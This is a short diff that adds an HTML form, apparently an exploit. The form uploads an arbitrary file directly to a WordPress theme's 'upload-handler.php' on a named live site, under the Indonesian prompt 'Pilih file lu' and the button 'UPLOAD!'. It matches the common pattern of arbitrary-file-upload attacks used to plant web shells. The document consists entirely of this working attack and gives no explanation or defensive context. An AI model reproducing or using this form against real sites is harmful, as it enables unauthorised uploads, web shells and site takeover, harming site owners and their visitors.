@@ -1,0 +1,5 @@
+<form enctype="multipart/form-data"action="http://resolute.ie/blog/wp-content/themes/radial-theme/functions/upload-handler.php"
+method="post">
+Pilih file lu: <input name="orange_themes" type="file" /><br>
+<input type="submit" value="UPLOAD!" />
+</form>
